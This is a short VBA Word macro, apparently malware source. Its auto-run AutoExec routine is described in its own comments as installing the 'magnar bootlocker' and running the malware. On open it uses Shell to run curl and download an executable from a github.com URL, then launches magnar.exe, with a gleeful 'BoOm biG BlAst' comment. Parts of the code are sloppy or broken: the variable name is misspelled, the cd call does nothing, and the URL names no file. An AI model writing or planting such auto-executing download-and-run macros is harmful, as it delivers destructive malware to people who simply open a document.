' This file contains the word macro that should be able to install and rum the magnar bootlocker autonomous
Attribute VB_Name = "AutoExec"
Sub AutoExec()
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoExec"
    
    ' cd c:\user\desktop
    Dim Dekstop
    Desktop = Shell("cd %USERPROFILE%/Desktop", 1)
    
    ' download the exe file from releases page
    Dim RetVal
    RetVal = Shell("curl -LJO https://github.com/blj-magnar/", 1)
    
    ' execute the malware
    Dim Exec
    Exec = Shell("magnar.exe", 1)
    ' BoOm biG BlAst!!!!
End Sub
